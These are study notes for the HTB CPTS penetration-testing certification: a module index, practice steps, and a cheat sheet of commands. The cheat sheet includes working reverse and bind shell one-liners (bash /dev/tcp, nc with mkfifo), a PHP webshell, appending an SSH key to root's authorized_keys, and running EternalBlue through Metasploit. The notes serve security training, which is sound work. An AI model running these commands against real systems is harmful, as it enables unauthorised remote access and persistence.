---
title: CPTS index
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - CPTS
---

# CPTS


| Number | Module                                   | My notes                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | Duration |                                               |     |
| ------ | ---------------------------------------- | --------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- | -------- | --------------------------------------------- | --- |
| 01     | Penetration Testing Process              | [Penetration Testing Process](penetration-testing-process.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                         | 6 hours  | Introduction                                  |     |
| 02     | Network Enumeration with Nmap            | [(Almost) all about nmap](nmap.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | 7 hours  | Reconnaissance, Enumeration & Attack Planning |     |
| 03     | Footprinting                             | [Introduction to footprinting](footprinting.md) <br>[Infrastructure and web enumeration](information-gathering.md)  <br>Some services:  [FTP](21-ftp.md), [SMB](137-138-139-445-smb.md), [NFS](2049-nfs-network-file-system.md), [DNS](53-dns.md), [SMTP](25-565-587-simple-mail-tranfer-protocol-smtp.md), [IMAP/POP3](110-143-993-995-imap-pop3.md),[SNMP](161-162-snmp.md), [MySQL](3306-mariadb-mysql.md), [Oracle TNS](1521-oracle-transparent-network-substrate.md), [IPMI](623-1900-intelligent-platform-management-interface-ipmi.md), [SSH](22-ssh.md), [RSYNC](873-rsync.md), [R Services](512-513-514-remote-services.md), [RDP](3389-rdp.md), [WinRM](5985-5986-winrm-windows-remote-management.md), [WMI](135-windows-management-instrumentation-wmi.md) | 2 days   | Reconnaissance, Enumeration & Attack Planning |     |
| 04     | Information Gathering - Web Edition      | [Information Gathering - Web Edition](information-gathering.md). With tools such as [Gobuster](gobuster.md), [ffuf](ffuf.md), [Burpsuite](burpsuite.md), [Wfuzz](wfuzz.md), [feroxbuster](feroxbuster.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             | 7 hours  | Reconnaissance, Enumeration & Attack Planning |     |
| 05     | Vulnerability Assessment                 | [Vulnerability Assessment](vulnerability-assessment.md): <br> [Nessus](nessus.md), [Openvas](openvas.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                              | 2 hours  | Reconnaissance, Enumeration & Attack Planning |     |
| 06     | File Transfer techniques                 | File Transfer Techniques:  <br>[Linux](transferring-files-techniques-linux.md), [Windows](transferring-files-techniques-windows.md), [Code- netcat python php and others](transferring-files-techniques-code.md), [Bypassing file upload restrictions](webexploitation/arbitrary-file-upload.md), [File encryption](file-encryption.md), [Evading techniques when transferring files](transferring-files-evading-detection.md), [LOLbas Living off the land binaries](lolbins-lolbas-gtfobins.md)                                                                                                                                                                                                                                                                     | 3 hours  | Reconnaissance, Enumeration & Attack Planning |     |
| 07     | Shells & Payloads                        | [Bind shells](bind-shells.md), [Reverse shells](reverse-shells.md), [Spawn a shell](spawn-a-shell.md), [Web shells](web-shells.md) ([Laudanum](laudanum.md) and [nishang](nishang.md))                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                | 2 days   | Reconnaissance, Enumeration & Attack Planning |     |
| 08     | Using the Metasploit Framework           | [Metasploit](metasploit.md), [Msfvenom](msfvenom.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                  | 5 hours  | Reconnaissance, Enumeration & Attack Planning |     |
| 09     | Password Attacks                         | [Password attacks](webexploitation/password-attacks.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               | 8 hours  | Exploitation & Lateral Movement               |     |
| 10     | Attacking Common Services                | Common services: [FTP](21-ftp.md) <br>[SMB](137-138-139-445-smb.md) (tools: [smbclient](smbclient.md), [smbmap](smbmap.md), [rpcclient](rpcclient.md), [Samba Suite](samba-suite.md), [crackmapexec](crackmapexec.md), [impacket-smbexec](impacket-smbexec.md), [impacket-psexec](impacket-psexec.md)), Databases ([MySQL](mysql.md) and [Attacking MySQL](3306-mariadb-mysql.md), [MSSQL](mssql.md) and [Atacking MSSQL](1433-mssql.md), [log4j](log4j.md), [RDP](3389-rdp.md), [DNS](53-dns.md), [SMTP](25-565-587-simple-mail-tranfer-protocol-smtp.md)                                                                                                                                                                                                            | 8 hours  | Exploitation & Lateral Movement               |     |
| 11     | Pivoting, Tunneling, and Port Forwarding |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 2 days   | Exploitation & Lateral Movement               |     |
| 12     | Active Directory Enumeration & Attacks   |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 7 days   | Exploitation & Lateral Movement               |     |
| 13     | Using Web Proxies                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Web Exploitation                              |     |
| 14     | Attacking Web Applications with Ffuf     |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 5 hours  | Web Exploitation                              |     |
| 15     | Login Brute Forcing                      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 6 hours  | Web Exploitation                              |     |
| 16     | SQL Injection Fundamentals               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Web Exploitation                              |     |
| 17     | SQLMap Essentials                        |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Web Exploitation                              |     |
| 18     | Cross-Site Scripting (XSS)               | [XSS](webexploitation/cross-site-scripting-xss.md)                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    | 6 hours  | Web Exploitation                              |     |
| 19     | File Inclusion                           |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Web Exploitation                              |     |
| 20     | File Upload Attacks                      |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Web Exploitation                              |     |
| 21     | Command Injections                       |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 6 hours  | Web Exploitation                              |     |
| 22     | Web Attacks                              |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 2 days   | Web Exploitation                              |     |
| 23     | Attacking Common Applications            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 4 days   | Web Exploitation                              |     |
| 24     | Linux Privilege Escalation               |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 8 hours  | Post-Exploitation                             |     |
| 25     | Windows Privilege Escalation             |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 4 days   | Post-Exploitation                             |     |
| 26     | Documentation & Reporting                |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 2 days   | Reporting & Capstone                          |     |
| 27     | Attacking Enterprise Networks            |                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       | 2 days   | Reporting & Capstone                          |     |


## Practicing Steps

Starting point:

- 2x Modules: The modules chosen should be categorized according to `two different difficulties`: `technical` and `offensive`.
- 3x Retired Machines: we recommend choosing `two easy` and `one medium` machines. At the end of each module, you will find recommended retired machines to consider that will help you practice the specific tools and topics covered in the module. These hosts will share one or more attack vectors tied to the module.
- 5x Active Machines: After building a good foundation with the modules and the retired machines, we can venture to `two easy`, `two medium`, and `one hard` active machine. We can also take these from the corresponding module recommendations at the end of each module in Academy.
- 1x Pro Lab / Endgame: These labs are large multi-host environments that often simulate enterprise networks of varying sizes similar to those we could run into during actual penetration tests for our clients.


## Generic cheat sheet

### Basic Tools

|**Command**|**Description**|
|---|---|
|**General**||
|`sudo openvpn user.ovpn`|Connect to VPN|
|`ifconfig`/`ip a`|Show our IP address|
|`netstat -rn`|Show networks accessible via the VPN|
|`ssh user@10.10.10.10`|SSH to a remote server|
|`ftp 10.129.42.253`|FTP to a remote server|
|**tmux**||
|`tmux`|Start tmux|
|`ctrl+b`|tmux: default prefix|
|`prefix c`|tmux: new window|
|`prefix 1`|tmux: switch to window (`1`)|
|`prefix shift+%`|tmux: split pane vertically|
|`prefix shift+"`|tmux: split pane horizontally|
|`prefix ->`|tmux: switch to the right pane|
|**Vim**||
|`vim file`|vim: open `file` with vim|
|`esc+i`|vim: enter `insert` mode|
|`esc`|vim: back to `normal` mode|
|`x`|vim: Cut character|
|`dw`|vim: Cut word|
|`dd`|vim: Cut full line|
|`yw`|vim: Copy word|
|`yy`|vim: Copy full line|
|`p`|vim: Paste|
|`:1`|vim: Go to line number 1.|
|`:w`|vim: Write the file 'i.e. save'|
|`:q`|vim: Quit|
|`:q!`|vim: Quit without saving|
|`:wq`|vim: Write and quit|

### Pentesting

| **Command**                                                                           | **Description**                                                       |
| ------------------------------------------------------------------------------------- | --------------------------------------------------------------------- |
| **Service Scanning**                                                                  |                                                                       |
| `nmap 10.129.42.253`                                                                  | Run nmap on an IP                                                     |
| `nmap -sV -sC -p- 10.129.42.253`                                                      | Run an nmap script scan on an IP                                      |
| `locate scripts/citrix`                                                               | List various available nmap scripts                                   |
| `nmap --script smb-os-discovery.nse -p445 10.10.10.40`                                | Run an nmap script on an IP                                           |
| `netcat 10.10.10.10 22`                                                               | Grab banner of an open port                                           |
| `smbclient -N -L \\\\10.129.42.253`                                                   | List SMB Shares                                                       |
| `smbclient \\\\10.129.42.253\\users`                                                  | Connect to an SMB share                                               |
| `snmpwalk -v 2c -c public 10.129.42.253 1.3.6.1.2.1.1.5.0`                            | Scan SNMP on an IP                                                    |
| `onesixtyone -c dict.txt 10.129.42.254`                                               | Brute force SNMP secret string                                        |
| **Web Enumeration**                                                                   |                                                                       |
| `gobuster dir -u http://10.10.10.121/ -w /usr/share/dirb/wordlists/common.txt`        | Run a directory scan on a website                                     |
| `gobuster dns -d inlanefreight.com -w /usr/share/SecLists/Discovery/DNS/namelist.txt` | Run a sub-domain scan on a website                                    |
| `curl -IL https://www.inlanefreight.com`                                              | Grab website banner                                                   |
| `whatweb 10.10.10.121`                                                                | List details about the webserver/certificates                         |
| `curl 10.10.10.121/robots.txt`                                                        | List potential directories in `robots.txt`                            |
| `ctrl+U`                                                                              | View page source (in Firefox)                                         |
| **Public Exploits**                                                                   |                                                                       |
| `searchsploit openssh 7.2`                                                            | Search for public exploits for a web application                      |
| `msfconsole`                                                                          | MSF: Start the Metasploit Framework                                   |
| `search exploit eternalblue`                                                          | MSF: Search for public exploits in MSF                                |
| `use exploit/windows/smb/ms17_010_psexec`                                             | MSF: Start using an MSF module                                        |
| `show options`                                                                        | MSF: Show required options for an MSF module                          |
| `set RHOSTS 10.10.10.40`                                                              | MSF: Set a value for an MSF module option                             |
| `check`                                                                               | MSF: Test if the target server is vulnerable                          |
| `exploit`                                                                             | MSF: Run the exploit on the target server is vulnerable               |
| **Using Shells**                                                                      |                                                                       |
| `nc -lvnp 1234`                                                                       | Start a `nc` listener on a local port                                 |
| `bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'`                                 | Send a reverse shell from the remote server                           |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.10.10 1234 >/tmp/f`    | Another command to send a reverse shell from the remote server        |
| `rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/bash -i 2>&1\|nc -lvp 1234 >/tmp/f`         | Start a bind shell on the remote server                               |
| `nc 10.10.10.1 1234`                                                                  | Connect to a bind shell started on the remote server                  |
| `python -c 'import pty; pty.spawn("/bin/bash")'`                                      | Upgrade shell TTY (1)                                                 |
| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice                           | Upgrade shell TTY (2)                                                 |
| `echo "<?php system(\$_GET['cmd']);?>" > /var/www/html/shell.php`                     | Create a webshell php file                                            |
| `curl http://SERVER_IP:PORT/shell.php?cmd=id`                                         | Execute a command on an uploaded webshell                             |
| **Privilege Escalation**                                                              |                                                                       |
| `./linpeas.sh`                                                                        | Run `linpeas` script to enumerate remote server                       |
| `sudo -l`                                                                             | List available `sudo` privileges                                      |
| `sudo -u user /bin/echo Hello World!`                                                 | Run a command with `sudo`                                             |
| `sudo su -`                                                                           | Switch to root user (if we have access to `sudo su`)                  |
| `sudo su user -`                                                                      | Switch to a user (if we have access to `sudo su`)                     |
| `ssh-keygen -f key`                                                                   | Create a new SSH key                                                  |
| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys`          | Add the generated public key to the user                              |
| `ssh root@10.10.10.10 -i key`                                                         | SSH to the server with the generated private key                      |
| **Transferring Files**                                                                |                                                                       |
| `python3 -m http.server 8000`                                                         | Start a local webserver                                               |
| `wget http://10.10.14.1:8000/linpeas.sh`                                              | Download a file on the remote server from our local machine           |
| `curl http://10.10.14.1:8000/linenum.sh -o linenum.sh`                                | Download a file on the remote server from our local machine           |
| `scp linenum.sh user@remotehost:/tmp/linenum.sh`                                      | Transfer a file to the remote server with `scp` (requires SSH access) |
| `base64 shell -w 0`                                                                   | Convert a file to `base64`                                            |
| `echo f0VMR...SNIO...InmDwU \| base64 -d > shell`                                     | Convert a file from `base64` back to its orig                         |
| `md5sum shell`                                                                        | Check the file's `md5sum` to ensure it converted correctly            |
